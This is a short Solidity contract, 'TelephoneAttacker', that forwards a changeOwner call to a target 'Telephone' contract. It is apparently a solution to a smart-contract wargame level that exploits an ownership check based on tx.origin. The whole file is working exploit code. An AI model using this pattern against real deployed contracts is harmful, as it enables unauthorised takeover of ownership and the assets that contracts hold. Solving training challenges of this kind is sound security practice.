// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone private s_telephone;

    constructor(address _telephone) {
        s_telephone = ITelephone(_telephone);
    }

    function attack(address _owner) external {
        s_telephone.changeOwner(_owner);
    }
}
